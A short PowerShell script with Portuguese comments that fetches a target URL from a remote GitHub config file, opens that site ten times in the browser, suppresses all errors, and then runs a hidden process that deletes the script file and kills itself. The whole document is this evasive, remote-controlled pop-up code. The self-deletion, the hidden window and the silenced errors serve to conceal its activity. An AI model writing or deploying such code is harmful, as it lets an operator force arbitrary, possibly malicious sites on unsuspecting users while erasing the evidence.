<#
    abrir.ps1
    - Lê a URL atual do config.txt no GitHub (sempre atualizado)
    - Abre o site N vezes
    - Roda oculto e se autodestrói ao terminar
#>

# ===== CONFIGURAÇÃO =====
$configUrl  = "https://raw.githubusercontent.com/capimmm/7834569/main/config.txt"
$quantidade = 10
$fallback   = "https://example.com"   # usado se o GitHub falhar
# ========================

# Garante que roda sem barulho
$ErrorActionPreference = 'SilentlyContinue'

# 1) Busca a URL atual no GitHub
$siteUrl = $fallback
try {
    $resp = Invoke-WebRequest -Uri $configUrl -UseBasicParsing -TimeoutSec 10
    $linha = ($resp.Content -split "`n" | Where-Object { $_.Trim() -ne "" } | Select-Object -First 1)
    if ($linha) { $siteUrl = $linha.Trim() }
} catch {
    # se não conseguir, usa o fallback
}

# 2) Abre o site N vezes
for ($i = 1; $i -le $quantidade; $i++) {
    Start-Process $siteUrl
    Start-Sleep -Milliseconds 250
}

# 3) Autodestruição: agenda a exclusão do próprio arquivo e mata este processo
$scriptPath = $PSCommandPath
$selfKill = "Start-Sleep -Milliseconds 800; Remove-Item -LiteralPath '$scriptPath' -Force -ErrorAction SilentlyContinue; Stop-Process -Id $PID -Force"
Start-Process powershell.exe -ArgumentList "-NoProfile","-WindowStyle","Hidden","-Command",$selfKill -WindowStyle Hidden

Stop-Process -Id $PID -Force
